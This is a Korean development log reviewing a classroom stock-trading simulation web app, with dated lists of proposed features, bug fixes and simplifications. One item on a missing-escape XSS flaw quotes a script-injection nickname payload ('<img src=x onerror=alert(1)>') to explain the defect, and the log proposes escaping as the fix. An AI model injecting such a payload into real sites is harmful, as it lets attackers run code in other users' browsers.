- **`lobby_members()` 호스트 또는 방 멤버 여부 미검증 — 임의 rid로 전체 참여자 닉네임 열람 가능** (이전 29일 항목 심화): `app.py:577-585` 는 `@login_required`만 적용. 방 멤버·호스트 체크 없음. 그러나 참가자 로비(`enterParticipantLobby()`)도 이 엔드포인트를 사용하므로(`app.js:579`) **완전 차단 불가**. 해결책: `user = cur_user()` 조회 후, `room.host_id == user.id OR RoomMember.query.filter_by(room_id=rid, user_id=user.id).exists()` 조건으로 방 관계자만 허용하는 guard 추가. 비관계자 403 반환. 서버 5줄.

- **`refreshMyRank()` 와 `enterParticipantGame()` 폴링 내 `/rankings` 중복 호출** (이전 분석에서 지적됐으나 해결책 구체화): `app.js:613` 의 10초 interval 콜백이 `refreshMyRank()` (`app.js:647`, 내부 `GET /rankings`)와 `S.currentPage === 'rankings'`인 경우 `loadParticipantRankings()` (역시 `GET /rankings`)를 모두 호출 → 순위 탭 활성화 시 10초마다 동일 API 2회 중복 호출. `room_dict()` (`app.py:288-305`)에 `my_rank` 필드를 추가하고 `GET /api/rooms/{rid}` 폴링을 재사용하면 `refreshMyRank()` 전용 호출 제거 가능. 현재 `room_dict()`가 이미 uid를 파라미터로 받으므로 (`app.py:278`) 서버 측 구현 용이.

## 2026-07-31

### 추가하면 좋을 기능

- **거래 요청 1초 쿨다운 (Rate limiting)** (`app.py:724-767`, `trade()`): `/api/rooms/<rid>/trade` 엔드포인트에 사용자별 속도 제한이 없음. 학생이 매수/매도 버튼을 빠르게 반복 클릭하면 동시 SQLite 쓰기가 발생해 `busy_timeout` 한도를 초과할 위험이 있음. `_trade_cooldown: dict = {}  # (rid, uid) -> float` in-memory 딕셔너리를 추가하고, `trade()` 진입 시 `time.time() - _trade_cooldown.get((rid,uid), 0) < 1.0`이면 `{'error': '1초 후 다시 시도하세요.'}` 반환(약 6줄 추가). 클라이언트에서도 버튼 disabled 처리와 연계하면 완벽. 교실에서 30명이 동시 접속하는 상황에 필수.

- **실시간 가격 변동 히스토리 차트** (`stock_service.py:281-310`, `get_history()`): 현재 차트 엔드포인트는 `random.gauss()`로 매 호출마다 완전히 다른 OHLCV 데이터를 생성함. 같은 종목 차트를 두 번 열면 완전히 다른 그래프가 표시되어 교육 목적으로 신뢰도가 없음. `StockService._price_log: list = []`에 `(timestamp, price)` 튜플을 `get_price()` 호출 때마다 append하고 최근 120개만 유지하면, `get_history()`에서 실제 게임 내 가격 움직임을 반환할 수 있음. 서버 약 10줄 수정으로 "내가 산 직후 주가가 어떻게 됐는지" 실제 추이 학습 가능.

- **진행자 이벤트 예고 카운트다운** (`app.py:1345-1360`, `host_market_event()`): 현재 섹터 이벤트는 버튼 클릭 즉시 적용되어 학생들이 반응할 시간이 없음. `countdown_seconds` 옵션(기본 0)을 추가해 `threading.Timer(countdown, lambda: ...)` 로 N초 후 가격 변동을 적용하고, 그 전에 "⚠️ {N}초 후 {sector} 섹터 이벤트 예정!" 뉴스를 먼저 발송하면 학생들이 매수/매도 판단을 실습할 수 있음. 약 8줄 추가.

- **참여자 로비 화면에 방 코드 표시** (`static/index.html:340-352`, `screen-p-lobby`): 참여자 대기 화면에 방 이름·진행자 이름은 있지만 방 코드가 없음. 학생이 실수로 나갔다 재입장 시 코드를 다시 물어봐야 하는 불편함 발생. `plobby-room-name` div 아래에 `<div class="muted" style="font-size:12px">방 코드: <strong id="plobby-room-code" style="letter-spacing:2px">–</strong></div>` 한 줄 추가하고 `enterParticipantLobby()` (`app.js:555-576`)에서 세팅하면 됨. 서버 변경 불필요.

- **호스트 순위 바 차트 스크롤** (`app.js:433-478`, `renderHostBarChart()`, `static/index.html:157`): `<canvas id="host-bar-chart" style="margin-top:16px;max-height:300px">` 설정으로 30명 이상 참여 시 학생 이름이 10px 이하로 줄어들어 판독 불가. canvas를 감싸는 `<div style="max-height:400px;overflow-y:auto">` wrapper를 추가하고 Chart.js `maintainAspectRatio: false` + 동적 height(`data.length * 28`)로 설정하면 많은 학생도 스크롤 가능하게 표시 가능.

- **퀴즈 오답·정답 이력 거래내역에 기록** (`app.py:1339`, `submit_quiz()`, `RoomTransaction`): 현재 퀴즈 결과는 모달이 닫히면 사라짐. `submit_quiz()`의 `db.session.commit()` 직전에 `db.session.add(RoomTransaction(room_id=rid, user_id=user.id, symbol='QUIZ', action='ADJ', amount=reward if correct else -penalty, note=f"{'정답' if correct else '오답'}: {q['q'][:60]}"))` 한 줄 추가. 거래 내역에서 `QUIZ` 항목으로 자신의 퀴즈 성과 확인 가능. 서버 2줄, 클라이언트 `t.action === 'QUIZ'` 배지 색상 처리 5줄 추가.

- **서버 재시작 후 룰렛 설정 복구** (`app.py:250-259`, `_roulette_config`, `models.py:25-41`): `_roulette_config`, `_quiz_settings`은 순수 in-memory dict로, Render 무료 플랜의 슬립/재시작 시 초기화됨. `Room` 모델에 `roulette_config_json = db.Column(db.Text, nullable=True)` 컬럼을 추가하고(ALTER TABLE 패턴 기존과 동일), 진행자가 `doSetRltConfig()` 저장 시 DB에도 JSON으로 저장하면 재시작 후에도 설정이 유지됨. 서버 약 15줄 수정.

### 제거/단순화할 것들

- **`_ending_soon` set 제거** (`app.py:90`, `room_dict():304`, `end_room():527`): `_ending_soon`은 1분 카운트다운 중인 방 ID를 추적하는 in-memory set. 그런데 이 상태는 `room.end_time`에 이미 인코딩되어 있음 (`end_time = now + 60s`로 업데이트됨). `room_dict()`에서 `'ending_soon': room.id in _ending_soon` 대신 `'ending_soon': bool(room.status == 'active' and room.end_time and (room.end_time - datetime.utcnow()).total_seconds() <= 65)` 로 대체하면 `_ending_soon` set 전체 제거 가능. 재시작 후 복구 문제도 동시 해결.

- **`lottery_rounds_done` VARCHAR(50) → Integer count로 단순화** (`models.py:41`, `app.py:34-36`, `app.py:225-229`, `_lot_round_due():171-199`): `lottery_rounds_done = "1,2,3"` 같은 쉼표 구분 문자열은 `split(',')`, `isdigit()`, `join()` 파싱이 필요하고 50자 제한으로 이론상 12회 초과 시 truncation 발생. 복권 회차는 단순 카운트(`completed_lottery_count int`)면 충분하며, 완료 여부는 `round_n <= completed_count`로 판별 가능. 기존 파싱 로직 전체 삭제 및 단순화.

- **`goHome()` 자동 로그아웃 제거** (`app.js:108-112`): `goHome()`은 `api.post('/api/auth/logout', {})` 을 호출해 세션을 파괴함. 학생이 실수로 "← 나가기" 버튼을 누르면 학번/이름을 다시 입력해야 해서 수업 흐름이 끊김. `goHome()`에서 logout API 호출을 제거하고, 다음 번 `/api/auth/me` 호출 시 기존 세션으로 복구되도록 하면 됨. 명시적 로그아웃은 별도 버튼으로만 허용. 서버 변경 없이 클라이언트 3줄 수정.

- **뉴스 폴링과 방 상태 폴링 통합** (`app.js:8-9`, `startNewsPolling()`, `S.pollInterval`): 현재 두 개의 독립적인 `setInterval` 체인이 동시 실행됨 — 방 상태 폴링(`S.pollInterval`, 10초)과 뉴스 폴링(`S.newsInterval`, 별도 주기). `loadNews()` 호출을 방 상태 폴링 루프(`app.js:613-651`) 안으로 통합하면 타이머 하나를 제거할 수 있음. 현재 뉴스 간격이 방 상태보다 짧아야 하는 경우라면 방 상태 폴링을 5초로 단축하고 통합. 코드 복잡도 감소.

- **스타트업 ALTER TABLE 마이그레이션 방식 개선** (`app.py:31-40`): `ALTER TABLE ... ADD COLUMN`을 `try/except`로 감싸 오류를 무시하는 방식은 "이미 컬럼 존재" 외의 실제 오류도 묻어버림. `PRAGMA table_info(rooms)` 로 컬럼 목록을 먼저 조회한 뒤 없을 때만 ALTER 실행하는 함수로 교체하면 오류 가시성이 높아짐. 약 10줄로 `_add_column_if_missing(db, 'rooms', 'col_name', 'BOOLEAN DEFAULT 0')` 헬퍼 함수 작성.

- **CDN 스크립트 SRI 해시 추가** (`static/index.html:971-972`): `chart.js@4.4.0`와 `qrcodejs@1.0.0`이 `integrity=""` 없이 CDN에서 로드됨. CDN이 변조되거나 버전 핀이 풀리면 악성 스크립트 실행 가능. `<script src="..." integrity="sha384-..." crossorigin="anonymous">` 형태로 SRI 해시를 추가하면 됨. jsdelivr.net의 SRI 생성기(srihash.com)에서 즉시 취득 가능.


## 2026-07-31 (2차)

### 추가하면 좋을 기능

- **진행자 공지 메시지 브로드캐스트** (`app.py` 신규 엔드포인트, `app.js:808-819 startNewsPolling()`): 진행자가 자유 텍스트로 모든 학생에게 공지를 보낼 수 있는 기능이 없음. `POST /api/rooms/<rid>/host/announce` 엔드포인트를 추가해 공지 텍스트를 in-memory dict에 저장하고, 학생 10초 폴링 루프에서 `GET /api/rooms/<rid>/announce`로 최신 공지 timestamp를 비교해 새 공지가 있으면 파란색 배너로 표시. 현재는 뉴스 이벤트(폭탄뉴스)만 전달 수단이므로 "지금 IT 섹터에 집중하세요" 같은 수업 가이드 메시지를 보낼 방법이 없음.

- **복권 미제출 학생 실시간 표시** (`app.py:1116-1147 get_lottery()`, `app.js:2079 _showLotHostPickingUI()`): `get_lottery()` 응답에는 `cur['picks']` dict로 제출한 학생 ID 목록이 있으나, 진행자용 응답(`room.host_id == user.id` 분기, line 1144)에는 `all_results`만 반환하고 picking 단계에서 `picked_uids`는 노출하지 않음. `state == 'picking'`일 때도 `'picked_uids': list(cur['picks'].keys())` 를 포함해 반환하고, 진행자 모달(`_showLotHostPickingUI()`)에서 전체 참여자 목록과 비교해 "미제출: 홍길동, 김철수" 를 실시간 표시. 60초 타이머 내에 독촉 가능.

- **거래량 기반 동적 주가 편향 (수요·공급 시뮬레이션)** (`stock_service.py:129-139 _next_price()`, `app.py:763-764 trade()`): 현재 모든 주가 변동은 뉴스 방향 힌트와 Gaussian 난수만으로 결정되어 실제 학생들의 거래가 가격에 영향을 미치지 않음. `StockService`에 `_net_buys: dict = {}` (symbol → int 순매수 합계) 를 추가하고, `trade()` 에서 BUY/SELL 시 `svc.record_trade(symbol, action)` 호출; `_next_price()` 에서 `net_buys > 5`면 `drift += 0.02` 추가 편향 적용 후 초기화. 학생들이 "많은 사람이 사면 오른다"는 수요·공급 원리를 체감 가능.

- **게임 중 예금 금리 실시간 변경** (`app.py:878-902 create_deposit()`, `models.py:34 Room.deposit_rate`): 현재 `deposit_rate`는 방 생성 시 고정되고 이후 변경 불가. `POST /api/rooms/<rid>/host/deposit-rate` 엔드포인트를 추가해 `room.deposit_rate`를 업데이트하고 `db.session.commit()`. 기존 예금은 생성 당시 잠긴 `dep.rate`를 사용하므로 소급 적용 없음. 진행자가 "금리 인상 발표!" 뉴스 이벤트 직후 금리를 올리면 학생들이 중앙은행 결정과 예금 인센티브 관계를 실습할 수 있음.

- **학생 개인 거래 내역 CSV 다운로드** (`app.py:829-847 get_transactions()`, `app.js:1838-1840 downloadExcel()`): Excel 내보내기는 진행자 전용 최종 순위 파일만 제공. 학생은 자신의 거래 내역을 파일로 받을 수 없음. `GET /api/rooms/<rid>/my-transactions/export` 를 추가해 Python `csv` 모듈로 "시각, 종목, 구분, 수량, 단가, 금액, 메모" 컬럼 CSV를 `send_file()`로 반환. 포트폴리오 페이지 거래 내역 하단에 "📥 내 거래 내역 다운로드" 버튼 추가. 학생 반성 자료 및 수행평가 증빙으로 활용 가능.

- **종목 목표가 알림 (클라이언트 전용)** (`app.js:1279-1283 toggleWatchlist()`, `app.js:1229-1241 loadMarket()`): 관심 종목 즐겨찾기(`watchlist`)는 화면 필터링만 지원하고 알림 기능 없음. 관심 종목 별표 버튼 롱클릭 또는 모달에서 목표가를 입력하면 `localStorage`에 `{symbol: targetPrice}` 저장; `loadMarket()` 에서 현재가와 비교해 목표가 도달 시 `toast('⭐ ${name} 목표가 도달!', 'info')` 표시. 서버 변경 없이 클라이언트 약 20줄로 구현. 학생들이 "삼성전자 80,000원 되면 알려줘" 식의 전략적 거래 훈련 가능.

### 제거/단순화할 것들

- **`_prev` 기준가 게임 시작 후 영구 고정 → 누적 변동률 표시 오류** (`stock_service.py:127-128 _init_prices()`, `app.py:661-670 get_stocks()`): `StockService._init_prices()` 에서 `self._prev[sym] = start` 를 초기화 시 한 번만 세팅하고 `get_price()` 호출 시 절대 갱신하지 않음. 따라서 `get_stocks()` 의 `ch = price - prev`, `ch_pct = ch / prev * 100` 은 게임 시작 기준 **누적** 변동을 표시. 30분 게임에서 변동성 높은 종목(TSLA `vol=0.055`)이 +38% 표시될 수 있어 학생들이 "등락률"을 잘못 해석. `get_price()` 에서 캐시 TTL 만료마다 `self._prev[sym] = price` 교체하면 직전 주기 대비 등락으로 수정됨.

- **`get_room()` 내 `cur_user()` 3회 중복 DB 쿼리** (`app.py:439, 444, 473`): `cur_user()` 는 내부적으로 `db.session.get(User, session['user_id'])` DB SELECT를 실행. `get_room()` 에서 line 439, 444, 473 세 곳에서 각각 호출되어 단일 요청당 User 테이블 SELECT가 최대 3번 발생. 함수 진입부에 `user = cur_user()` 한 번만 호출한 뒤 재사용하도록 수정하면 DB 쿼리 2회 절약. 학생 30명이 10초마다 `/api/rooms/<rid>` 를 폴링하면 초당 최대 9회의 불필요한 User SELECT 발생.

- **`enter()` TOCTOU 경쟁 조건 → 동시 가입 시 IntegrityError 500** (`app.py:334-340`): `User.query.filter_by(username=u).first()` 로 유저 존재 여부 확인 후 없으면 `User(username=u)` 생성. 두 요청이 동시에 동일 닉네임으로 들어오면 둘 다 "없음"으로 판단해 INSERT 시도 → UNIQUE 제약 위반 `IntegrityError` 발생. `join_room()` (`app.py:404`) 에는 `except IntegrityError: db.session.rollback()` 처리가 있으나 `enter()` 에는 없어 학생이 500 페이지를 봄. `try: db.session.add(user); db.session.commit() / except IntegrityError: db.session.rollback(); user = User.query.filter_by(username=u).first()` 로 수정 필요.

- **강제 청산 후 `RoomHolding` 고아 행 잔류(shares=0 미삭제)** (`app.py:1037`, `app.py:1318`): `trade()` 에서 매도 완료 시 `if holding.shares == 0: db.session.delete(holding)` 처리(`app.py:762`). 그러나 룰렛 강제 청산(`app.py:1037`: `h.shares = 0; h.avg_price = 0`)과 퀴즈 오답 패널티 청산(`app.py:1318`)에서는 `db.session.delete(h)` 없이 shares=0 행이 DB에 잔류. `get_portfolio()` 는 `if h.shares <= 0: continue` 로 걸러주지만(`app.py:782`) DB에 불필요한 행이 누적되고, 쿼리 결과 셋이 커짐. 두 청산 경로 모두 `if h.shares <= 0: db.session.delete(h)` 추가로 해결.

- **`host_force_price()`, `host_market_event()` 후 뉴스 캐시 미무효화** (`app.py:684-687 host_force_price()`, `app.py:1357 host_market_event()`): `host_send_news()` 는 `_invalidate_news_cache(rid)` 를 명시적으로 호출(`app.py:700`). 반면 `host_force_price()` 와 `host_market_event()` 는 `StockService` 내부적으로 `self._news` 를 업데이트하지만 `_invalidate_news_cache(rid)` 미호출. 결과적으로 학생들이 `NEWS_CACHE_TTL = 2.0초` 동안 진행자가 발동한 섹터 이벤트 뉴스를 보지 못함. 두 엔드포인트 말미에 `_invalidate_news_cache(rid)` 한 줄씩 추가로 즉각 해결.

- **금전 컬럼 전체 `Float` 타입 → 부동소수점 오차 누적** (`models.py:33, 52, 65, 77, 87-88`): `Room.starting_cash`, `RoomMember.cash`, `RoomHolding.avg_price`, `RoomTransaction.amount`, `Deposit.amount` 모두 `db.Column(db.Float)`. IEEE 754에서 `10_000_000.0 - 333_333.3 - 333_333.3 - 333_333.3` 는 정확히 0이 아닐 수 있어, 반복 거래 후 `-0.000001원` 같은 음수 잔액이 생성될 수 있음. `max(0, m.cash)` 가드(`app.py:599`)가 일부 보호하나 일관성 없음. `db.Numeric(precision=18, scale=2)` 로 교체 또는 모든 연산 결과에 `round(x, 0)` 적용 통일.

- **클라이언트 타이머가 학생 기기 로컬 시계 사용** (`app.js:769`): `rem = Math.max(0, Math.floor((new Date(S.room.end_time) - new Date()) / 1000))` 에서 `new Date()` 는 학생 기기 로컬 시계. 기기 시계가 서버 UTC 기준과 ±30초 오차나면 타이머 표시가 틀려 거래 가능한 시간을 오해. 서버가 이미 `remaining_seconds` 를 `room_dict()` 에서 계산해 반환하므로(`app.py:285-286`), 10초 폴링 시 수신한 `r.remaining_seconds` 로 타이머를 재보정하되 두 폴링 사이는 `setInterval(tick, 1000)` 로 감산하는 hybrid 방식이 정확. 현재 일시정지 상태에서만 `remaining_seconds` 를 사용(`app.js:765`)하고 active 상태에서는 로컬 시계를 사용하는 불일치가 있음.

## 2026-08-01

### 추가하면 좋을 기능

- **진행자 `host_adjust()` 초과 차감 시 실제 금액으로 트랜잭션 보정** (`app.py:599-600`): `m.cash = max(0, m.cash + delta)` 로 현금을 0 하한 클램핑하지만, 바로 다음 줄 `RoomTransaction(amount=delta, ...)` 에서는 실제 차감된 금액이 아닌 원래 입력값 `delta` 그대로 기록함. 예: 현금 500,000원인 학생에게 -1,000,000원 조정 시 실제 차감은 500,000원이지만 거래 내역에는 -1,000,000원이 남아 나중에 학생이 거래 내역을 보면 잔액 합계가 맞지 않음. `actual_delta = max(-m.cash, delta)` 를 구한 후 `m.cash = max(0, m.cash + delta)` 와 `RoomTransaction(amount=actual_delta, ...)` 로 분리해 기록하면 일관성 확보 (`app.py:599-600` 두 줄 수정).

- **차트 히스토리 마지막 봉 종가와 현재 표시 주가 연결** (`stock_service.py:289-308 get_history()`): `get_history()` 는 현재가(`current`)를 기준으로 과거 봉을 역방향으로 합성하지만 마지막 봉(`bars[-1].close`)은 난수 변동이 적용되어 `current`와 불일치함. 학생이 차트의 마지막 봉 종가와 현재가 표시가 다른 것을 보면 혼란스러울 수 있음. `bars[-1]['close'] = round(current)` 로 마지막 봉 종가를 현재가로 고정하면 차트와 시세 카드가 일치해짐 (`stock_service.py:308` 이전에 한 줄 추가).

- **예금 탭을 10초 폴링 루프에 포함** (`app.js:648-650`): 참여자 폴링 루프에서 `if (S.currentPage === 'market') loadMarket()`, `if (S.currentPage === 'rankings') loadParticipantRankings()` 분기는 있으나 `'deposit'` 탭이 누락됨. 예금 탭을 열어 두면 만기 예정 정보나 이자 예상치가 자동 갱신되지 않음. `if (S.currentPage === 'deposit') loadDeposits()` 한 줄 추가로 해결 (`app.js:649` 직후). 단, `loadDeposits()` 함수가 이미 `pg-deposit` 탭 진입 시(`showPage('deposit')`) 호출되므로 서버 부하는 기존 polller 주기 10초와 동일.

- **`1일·1주·1달·3달·1년` 차트 탭 봉 수 재조정** (`stock_service.py:293, app.py:715`): `get_chart()` 에서 UI 탭값 `'1d'→'1d'`, `'1w'→'5d'` 로 변환 후 `get_history(period)` 에 전달. `get_history()` 의 `n_bars` 매핑 `{'1d': 30, '5d': 5, '1mo': 30, '3mo': 90}` 에서 `'1d'` 는 30봉, `'5d'` 는 5봉으로 역전. 결과적으로 "1일" 탭이 30개 봉, "1주" 탭이 5개 봉을 표시해 1일보다 1주가 더 적은 데이터를 보여주는 직관 위반 발생. `{'1d': 7, '5d': 35, '1mo': 30, '3mo': 90, '1y': 52}` 로 수정하면 각 탭 레이블과 봉 수가 일치 (`stock_service.py:293` 한 줄).

- **데이터 로드 실패 시 UI 오류 메시지 표시** (`app.js:loadMarket, loadPortfolio, loadDeposits` 등): 현재 `loadMarket()`, `loadPortfolio()` 등 대부분의 load 함수는 `if (data.error) return;` 으로 에러 시 조용히 종료하고 화면을 이전 상태로 방치함. 학생이 네트워크 오류나 Render free tier 슬립으로 데이터를 못 받아도 아무 안내 없이 빈 화면을 보게 됨. 각 load 함수의 에러 분기에 `toast('데이터를 불러오지 못했습니다. 잠시 후 다시 시도해주세요.', 'error')` 또는 컨테이너 안에 재시도 버튼 포함 empty-state HTML 삽입으로 UX 개선.

### 제거/단순화할 것들

- **복권 기본 상금 `member_count × 3,000만원` → 투자 게임 균형 파괴** (`app.py:419`): 자동 복권 시작 시 `default_prize = member_count * 30_000_000`. 30명 수업이면 기본 상금 9억원. 시작 자금(기본 1,000만원)의 90배를 단 1회 추첨으로 받을 수 있어, 복권 당첨 한 번이 전략적 투자 전체를 압도하는 구조. 교육 목적상 주식 투자 전략의 의미가 퇴색. `default_prize = member_count * 1_000_000` (인당 100만원 기준)이나 `room.starting_cash * 0.1` (시작 자금 10%) 같이 게임 스케일에 비례한 값으로 변경 권장 (`app.py:419` 한 줄). 자동 복권 안내 노티스(`index.html:866`)의 설명도 함께 업데이트 필요.

- **`get_history()` 차트 봉에 주말 날짜 포함 — 실제 증권시장과 불일치** (`stock_service.py:297`): `date_str = datetime.utcfromtimestamp(now - i * 86400).strftime('%Y-%m-%d')` 로 오늘부터 n일 전까지 연속 날짜를 생성하므로 토·일요일도 봉으로 표시됨. 한국 고등학생에게 "주식 시장은 평일에만 열린다"고 설명하면서 차트에는 주말 봉이 있어 교육 내용 모순 발생. `datetime.utcfromtimestamp(now - i * 86400)` 을 생성할 때 `.weekday() >= 5` 이면 건너뛰는 로직 추가, 또는 `n_bars` 를 더 늘려 주말을 skip해도 목표 봉 수가 채워지도록 수정 (`stock_service.py:296-298` 약 5줄 변경).

- **`minigame_close()` 에서 deprecated `Room.query.get(rid)` 사용** (`app.py:977`): 코드 전반에서 `db.session.get(Room, rid)` 패턴(SQLAlchemy 2.x 권장)을 사용하지만, `minigame_close()` 함수 line 977 에서만 `Room.query.get(rid)` (레거시 API, SQLAlchemy 2.0에서 삭제 예고)를 사용. `db.session.get(Room, rid)` 로 교체하면 일관성 확보 (`app.py:977` 한 줄). `get_room()` (`app.py:435`) 등 `Room.query.get_or_404()` 도 `db.session.get_or_404(Room, rid)` 또는 직접 404 처리로 통일 권장.

- **학번+이름 단일 문자열 저장 구조에서 공백 포함 이름 시 Excel 분리 오류** (`app.py:1435-1438, models.py:19`): `username` 컬럼에 `"학번 이름"` 형식으로 저장하고 Excel 내보내기 시 `u.username.split(' ', 1)` 으로 분리. 학생이 이름 필드에 "홍 길동"(띄어쓰기 포함) 입력 시 split 결과 `['학번', '홍']` + `'길동'` 이 아닌 `['학번홍', '길동']` 으로 잘못 분리됨 (학번 필드에 공백 없으면 실질 발생 사례 희박하나, `doAuth('', '홍 길동')` 처럼 학번 없이 이름에 공백 있으면 확실히 오기록). 단기 해결: `enter()` 에서 이름 필드의 앞뒤 공백만 `strip()` 하고 중간 공백도 `re.sub(r'\s+', '', name)` 으로 제거, 또는 구분자를 `'|'` 처럼 실명에 쓰이지 않는 문자로 변경.

- **`refreshMyRank()` 가 `/api/rooms/<rid>/rankings` 를 매번 전체 계산 — N×M 가격 조회 반복** (`app.py:808-824, app.js:735-753`): `get_rankings()` 는 `RoomMember.query.filter_by(room_id=rid).all()` 로 전 멤버를 가져와 각각 `member_total_value()` 를 호출하고, `member_total_value()` 내부에서 `get_room_service(rid).get_price(h.symbol)` 을 holding별로 호출. 30명 × 평균 5종목 = 150회 `get_price()` 가 10초마다 실행됨. `_get_room_cached()` 같은 순위 캐시가 없어 Render free tier 단일 워커 환경에서 응답 지연 유발 가능. 순위 전용 TTL=5초 캐시(`_rankings_cache: dict = {}`)를 추가하거나, `refreshMyRank()` 가 이미 받는 랭킹 배열에서 `is_me` 항목만 꺼내는 현재 구조를 유지하되 `/api/rooms/<rid>` 응답에 `my_rank`, `my_total_value`, `my_gain_pct` 를 포함시켜 별도 API 호출을 제거하는 방안 고려.

## 2026-08-01 (2차)

### 추가하면 좋을 기능

- **주식 상세 모달 내 관심종목 토글 버튼** (`app.js:1327-1357`, `openStockModal()`; `app.js:1279-1285`, `toggleWatchlist()`): 관심종목 추가/제거는 시장 그리드 카드의 ☆ 버튼에서만 가능하고, 주식 상세 모달(`modal-stock`)을 열었을 때는 관심종목 컨트롤이 없어 모달을 닫고 돌아가야 함. `openStockModal()` 마지막에 `const starred = S.watchlist.has(symbol); document.getElementById('ms-watchlist-btn').textContent = starred ? '★ 관심해제' : '☆ 관심추가'` 와 같이 버튼 상태를 동기화하면 됨. `toggleWatchlist()` 함수를 재사용하므로 서버 변경 없이 HTML 버튼 1개 + JS 3줄 추가로 구현 가능. 거래 중 관심종목 등록까지 한 화면에서 처리해 불필요한 화면 전환 제거.

- **게임 종료 후 진행자용 인게임 통계 요약 카드** (`app.py:807-824`, `get_rankings()`; `app.js` 결과 화면): 게임 종료 후 진행자 결과 화면에는 순위표와 Excel 내보내기만 있고, 게임 전체 통계(가장 많이 거래된 종목, 총 거래 횟수, 최고·최저 수익률, 평균 수익률)를 한눈에 볼 수 없음. `GET /api/rooms/<rid>/host/stats` 엔드포인트를 추가해 `RoomTransaction.query.filter_by(room_id=rid).all()` 로 종목별 거래 횟수를 집계하고, `member_total_value()` 배치 결과에서 수익률 분포를 계산해 반환. 결과 화면 상단에 "🏆 게임 통계" 카드를 렌더링하면 수업 마무리 토론 자료로 즉시 활용 가능. 서버 약 20줄·클라이언트 약 25줄.

- **종목 가격 상·하한 범위 안내 표시** (`stock_service.py:139`, `_next_price()`; `app.py:658-671`, `get_stocks()`): 게임 내 주가는 `max(base*0.6, min(base*1.4, new_price))` 로 제한되지만(`stock_service.py:139`) 학생들이 이 한도를 알 수 없어 주식이 왜 더 이상 오르지 않는지 이해하지 못함. `get_stocks()` 응답에 `price_floor: round(base*0.6)`, `price_cap: round(base*1.4)` 를 추가하고(서버 2줄), 주식 상세 모달의 현재가 아래에 "하한가 X원 | 상한가 Y원" 을 작은 글씨로 표시(클라이언트 3줄). 주식시장의 상·하한가 개념을 자연스럽게 교육하는 효과.

- **섹터 필터 버튼에 종목 수 배지 표시** (`app.js:1243-1249`, `renderSectors()`): 섹터 필터 버튼(`<button class="sector-btn">반도체</button>`)에 해당 섹터에 속하는 종목 수가 표시되지 않아 어느 섹터가 더 다양한지 파악하기 어려움. `renderSectors()` 내에서 `const cnt = s === '전체' ? S.stocks.length : S.stocks.filter(st => st.sector === s).length` 를 계산해 버튼 텍스트를 `반도체 (3)` 형태로 표시. 서버 변경 없이 클라이언트 3줄 수정으로 구현 가능. 섹터별 다양성을 시각화해 분산 투자 교육에 활용.

- **포트폴리오 보유 종목 정렬 옵션** (`app.js:1542-1563`, `holdings-list` 렌더링; `app.py:802`, `get_portfolio()`): 보유 종목은 항상 현재 가치 내림차순으로만 표시됨(`sorted(..., key=lambda x: x['current_value'], reverse=True)`). `loadPortfolio()` 의 보유 종목 섹션 상단에 정렬 기준 `<select>` (현재가치·수익률·수익금액·보유수량)를 추가하고, 선택 시 클라이언트에서 `data.holdings`를 재정렬해 렌더링. `S.portSortKey` 상태 변수를 추가해 새로고침 시에도 선택 유지. 서버 변경 없이 약 12줄 추가로 학생이 가장 손실이 큰 종목을 쉽게 파악 가능.

- **진행자 학생 전체 공지 메시지 브로드캐스트** (`app.py:630-646`, `host_send_news()`; `app.js:807-818`, `startNewsPolling()`): 교사가 게임 중 학생들에게 텍스트 공지를 보낼 방법이 없어 수업 안내는 구두로만 가능. 기존 뉴스 폴링 인프라를 재활용해 `GET /news` 응답에 `announcement: str | null` 필드를 추가하고, 새 `POST /api/rooms/<rid>/host/announce` 엔드포인트(`{"message": "지금 삼성전자 주목!"}`)에서 이 값을 `StockService` 인스턴스에 임시 저장(5분 TTL). 클라이언트는 `announcement` 수신 시 뉴스 팝업과 별개의 파란색 배너로 30초 표시. 서버 15줄·클라이언트 10줄 추가.

### 제거/단순화할 것들

- **XSS 취약점: 사용자명 HTML 이스케이프 누락** (`app.js:421`, `app.js:426`, `loadHostMembers()`; `app.js:225-231`, `loadLobbyMembers()`; `app.py:333-334`, `enter()`): `m.username` 을 `innerHTML` 템플릿에 직접 삽입(`${m.username}`)하고 있어, `<img src=x onerror=alert(1)>` 같은 닉네임으로 가입한 학생이 진행자 화면에서 임의 JS 실행 가능. `app.py:333` 의 닉네임 검증은 길이(2~30자)만 확인하고 특수문자를 허용. `escHtml()` 함수가 `app.js:897-899` 에 이미 정의되어 있으므로 모든 `${m.username}` 인라인 보간을 `${escHtml(m.username)}` 으로 교체. `onclick` 속성의 문자열 보간(`'${m.username.replace(...)}`)은 `data-username` 어트리뷰트 방식으로 전환하거나 `app.py:333` 에서 정규식 검증 추가 필요.

- **`datetime.utcnow()` 전면 deprecated — Python 3.12 대응 필요** (`app.py:125, 279, 421, 437, 458, 482, 498, 511, 521, 534, 953, 985, 1101, 1103`; `models.py:20, 38, 53`): `datetime.utcnow()` 와 `default=datetime.utcnow` 는 Python 3.12에서 deprecated되어 향후 제거 예정. `app.py:2` 에서 `timezone` 이 이미 임포트되어 있으므로 일괄 치환: `datetime.utcnow()` → `datetime.now(timezone.utc)`, `models.py` 의 컬럼 기본값 `default=datetime.utcnow` → `default=lambda: datetime.now(timezone.utc)`. `sed -i 's/datetime\.utcnow()/datetime.now(timezone.utc)/g' app.py` 로 대부분 일괄 처리 가능. 동시에 `_end_room()` 의 `now = datetime.utcnow()` 포함 전체 16개소 수정.

- **`member_total_value()` N+1 쿼리 성능 문제** (`app.py:107-118`, `member_total_value()`; `app.py:542-562`, `host_members()`; `app.py:807-824`, `get_rankings()`): `get_rankings()` 와 `host_members()` 는 각 멤버마다 `member_total_value()` 를 개별 호출하고, 이 함수는 내부에서 `RoomHolding.query.filter_by(room_id, user_id)` + `Deposit.query.filter_by(room_id, user_id)` 쿼리를 실행. 30명 교실에서 `get_rankings()` 1회 호출 시 SQL 쿼리 약 60회 이상 발생. 수정: `RoomHolding.query.filter_by(room_id=rid).all()` 과 `Deposit.query.filter_by(room_id=rid, status='active').all()` 로 방 전체 데이터를 각 2회 쿼리로 가져와 Python dict로 uid별 집계하면 O(N) → O(1) 로 단축.

